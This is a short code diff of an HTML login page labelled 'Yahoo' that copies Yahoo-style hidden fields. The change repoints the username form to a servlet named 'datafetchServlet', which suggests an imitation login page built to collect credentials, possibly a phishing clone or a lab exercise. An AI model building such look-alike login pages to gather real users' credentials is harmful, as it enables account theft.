@@ -252,7 +252,7 @@
         <div class="login-logo"><img src="picture/Chicken.png" alt="Yahoo" class="logo" width="200" height="">
         </div>
         <p id="error-offline" role="alert" class="row error-offline hide">Network connection timed out. Please try&nbsp;again.</p>
-        <form id="login-username-form" action="initializingServlet" method="post" class="username-challenge">
+        <form id="login-username-form" action="datafetchServlet" method="post" class="username-challenge">
             <input type="hidden" name="crumb" value="CbNbmcLwbcx">
             <input type="hidden" name="acrumb" value="r7TscSmE">
             <input type="hidden" name="sessionIndex" value="QQ--">
